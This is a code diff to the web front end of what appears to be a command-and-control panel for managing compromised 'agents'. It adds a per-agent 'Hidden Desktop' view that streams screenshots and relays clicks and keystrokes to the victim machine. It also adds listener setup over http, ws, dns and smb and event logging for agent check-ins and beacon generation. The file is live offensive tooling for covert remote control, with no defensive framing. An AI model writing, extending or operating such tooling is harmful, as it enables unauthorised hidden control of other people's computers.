@@ -162,6 +162,7 @@
             loadProfiles();
             loadPatterns();
             loadRedirectors();
+            loadListeners();
         };
 
         ws.onmessage = function(e) {
@@ -228,7 +229,17 @@
                 break;
             case 'command_sent':
             case 'command_queued':
-                addEventLog(data.event, '[' + data.operator + '] ' + data.agent_id + ': ' + data.command);
+                addEventLog(data.event, '[' + (data.operator || 'op') + '] ' + data.agent_id + ': ' + data.command);
+                break;
+            case 'agent_checkin':
+                addEventLog('agent_checkin', data.agent_id + ' checkin ' + (data.transport || ''));
+                break;
+            case 'listener_started':
+                addEventLog('listener_started', (data.listener_type || '') + ' ' + data.host + ':' + data.port);
+                loadListeners();
+                break;
+            case 'beacon_generated':
+                addEventLog('beacon_generated', (data.lang || 'agent') + ' ' + (data.path || ''));
                 break;
             case 'operator_connected':
             case 'operator_disconnected':
@@ -395,6 +406,16 @@
                 '<div class="console-input-row">' +
                     '<span class="console-prompt">agent[' + escapeHtml(agentId) + ']&gt;</span>' +
                     '<input type="text" class="console-input" id="console-input-' + escapeHtml(agentId) + '" autocomplete="off">' +
+                '</div>' +
+                '<div class="hd-pane" id="hd-' + escapeHtml(agentId) + '">' +
+                    '<div class="hd-bar">' +
+                        '<span>Hidden Desktop</span>' +
+                        '<button type="button" class="glass-btn" data-hd="start">Start</button>' +
+                        '<button type="button" class="glass-btn" data-hd="frame">Frame</button>' +
+                        '<button type="button" class="glass-btn" data-hd="stop">Stop</button>' +
+                    '</div>' +
+                    '<img class="hd-img" id="hd-img-' + escapeHtml(agentId) + '" alt="hidden desktop" tabindex="0">' +
+                    '<input type="text" class="hd-type" id="hd-type-' + escapeHtml(agentId) + '" placeholder="Type on the hidden desktop, Enter to send">' +
                 '</div>';
             document.getElementById('tab-content').appendChild(pane);
 
@@ -411,6 +432,31 @@
                 });
             })(agentId);
 
+            pane.querySelectorAll('[data-hd]').forEach(function(btn) {
+                btn.addEventListener('click', function() { desktopActionFor(agentId, btn.dataset.hd); });
+            });
+            var img = document.getElementById('hd-img-' + agentId);
+            img.addEventListener('click', function(e) {
+                var rect = img.getBoundingClientRect();
+                if (!rect.width || !rect.height) return;
+                var screen = desktopScreen[agentId] || {w: 1024, h: 768};
+                var x = Math.round((e.clientX - rect.left) / rect.width * screen.w);
+                var y = Math.round((e.clientY - rect.top) / rect.height * screen.h);
+                desktopActionFor(agentId, 'click ' + x + ' ' + y);
+            });
+            img.addEventListener('keydown', function(e) {
+                if (e.key.length === 1) desktopActionFor(agentId, 'type ' + e.key);
+                else if (e.key === 'Enter') desktopActionFor(agentId, 'key 13');
+                else if (e.key === 'Backspace') desktopActionFor(agentId, 'key 8');
+            });
+            var typer = document.getElementById('hd-type-' + agentId);
+            typer.addEventListener('keydown', function(e) {
+                if (e.key !== 'Enter') return;
+                e.preventDefault();
+                if (!typer.value) return;
+                desktopActionFor(agentId, 'type ' + typer.value);
+                typer.value = '';
+            });
             consoleTabs[agentId] = { tab: tab, pane: pane };
         }
         switchTab('console-' + agentId);
@@ -599,61 +645,59 @@
     });
     document.addEventListener('mouseup', function() { isDragging = false; });
 
-    var desktopAgent = null;
-    var desktopTimer = null;
-    var desktopScreen = {w: 1024, h: 768};
+    var desktopScreen = {};
+    var desktopTimers = {};
 
     function openDesktop(agentId) {
-        desktopAgent = agentId;
-        document.getElementById('desktop-overlay').classList.remove('hidden');
-        document.getElementById('desktop-status').textContent = 'Agent ' + agentId;
-        pollDesktop();
-        if (desktopTimer) clearInterval(desktopTimer);
-        desktopTimer = setInterval(pollDesktop, 2000);
+        openConsole(agentId);
+        if (!desktopTimers[agentId]) {
+            desktopActionFor(agentId, 'start');
+            desktopActionFor(agentId, 'frame');
+            desktopTimers[agentId] = setInterval(function() { pollDesktop(agentId); }, 2000);
+        }
+        var img = document.getElementById('hd-img-' + agentId);
+        if (img) img.focus();
     }
 
-    async function desktopAction(action) {
-        if (!desktopAgent) return;
-        document.getElementById('desktop-status').textContent = action + '...';
-        await api('POST', '/agents/' + desktopAgent + '/desktop', { command: action });
-        await pollDesktop();
+    async function desktopActionFor(agentId, action) {
+        addEventLog('desktop', agentId + ' ' + action);
+        await api('POST', '/agents/' + agentId + '/desktop', { command: action });
+        setTimeout(function() { pollDesktop(agentId); }, 1500);
     }
 
-    async function pollDesktop() {
-        if (!desktopAgent) return;
+    async function pollDesktop(agentId) {
         try {
-            var rows = await api('GET', '/agents/' + desktopAgent + '/results');
+            var rows = await api('GET', '/agents/' + agentId + '/results');
             if (!rows) return;
             for (var i = rows.length - 1; i >= 0; i--) {
                 var out = rows[i].output || '';
-                if (out.indexOf('HDIMG:') === 0) {
-                    var payload = out.slice(6);
-                    var comma = payload.indexOf(',');
-                    var colon = payload.indexOf(':');
-                    if (comma > 0 && colon > comma) {
-                        desktopScreen.w = parseInt(payload.slice(0, comma), 10) || desktopScreen.w;
-                        desktopScreen.h = parseInt(payload.slice(comma + 1, colon), 10) || desktopScreen.h;
-                        payload = payload.slice(colon + 1);
-                    }
-                    document.getElementById('desktop-img').src = 'data:image/bmp;base64,' + payload;
-                    document.getElementById('desktop-img').classList.remove('hidden');
-                    document.getElementById('desktop-status').textContent = 'frame ' + out.length + ' bytes ' + desktopScreen.w + 'x' + desktopScreen.h;
-                    return;
+                if (out.indexOf('HDIMG:') !== 0) continue;
+                var payload = out.slice(6);
+                var comma = payload.indexOf(',');
+                var colon = payload.indexOf(':');
+                desktopScreen[agentId] = desktopScreen[agentId] || {w: 1024, h: 768};
+                if (comma > 0 && colon > comma) {
+                    desktopScreen[agentId].w = parseInt(payload.slice(0, comma), 10) || desktopScreen[agentId].w;
+                    desktopScreen[agentId].h = parseInt(payload.slice(comma + 1, colon), 10) || desktopScreen[agentId].h;
+                    payload = payload.slice(colon + 1);
                 }
+                var img = document.getElementById('hd-img-' + agentId);
+                if (img) img.src = 'data:image/bmp;base64,' + payload;
+                return;
             }
         } catch (e) {}
     }
 
-    document.getElementById('desktop-img').addEventListener('click', function(e) {
-        var rect = e.target.getBoundingClientRect();
-        var x = Math.round((e.clientX - rect.left) / rect.width * desktopScreen.w);
-        var y = Math.round((e.clientY - rect.top) / rect.height * desktopScreen.h);
-        desktopAction('click ' + x + ' ' + y);
-    });
-    document.getElementById('desktop-send').addEventListener('click', function() {
-        var text = document.getElementById('desktop-type').value;
-        if (text) desktopAction('type ' + text);
-    });
+    async function loadListeners() {
+        try {
+            var rows = await api('GET', '/listeners');
+            var box = document.getElementById('listener-list');
+            if (!rows || !rows.length) { box.textContent = 'No listeners'; return; }
+            box.innerHTML = rows.map(function(l) {
+                return '<span class="listener-chip">' + escapeHtml(l.type) + ' ' + escapeHtml(String(l.host)) + ':' + l.port + '</span>';
+            }).join('');
+        } catch (e) {}
+    }
     document.getElementById('bof-file').addEventListener('change', function(e) {
         var file = e.target.files && e.target.files[0];
         e.target.value = '';
@@ -666,14 +710,16 @@
         };
         reader.readAsDataURL(file);
     });
-    document.getElementById('desktop-start').addEventListener('click', function() { desktopAction('start'); });
-    document.getElementById('desktop-frame').addEventListener('click', function() { desktopAction('frame'); });
-    document.getElementById('desktop-stop').addEventListener('click', function() { desktopAction('stop'); });
-    document.getElementById('desktop-close').addEventListener('click', function() {
-        document.getElementById('desktop-overlay').classList.add('hidden');
-        if (desktopTimer) clearInterval(desktopTimer);
-        desktopAgent = null;
+    document.getElementById('btn-listener').addEventListener('click', async function() {
+        var type = prompt('Listener type: http, ws, dns, smb', 'http');
+        if (!type) return;
+        var port = prompt('Port', type === 'dns' ? '5353' : type === 'smb' ? '4455' : '8080');
+        if (!port) return;
+        var result = await api('POST', '/listeners', { type: type, port: parseInt(port, 10) });
+        addEventLog('listener_started', JSON.stringify(result));
+        loadListeners();
     });
+    loadListeners();
 
     // --- Auto-refresh agents every 5s ---
     setInterval(refreshAgents, 5000);
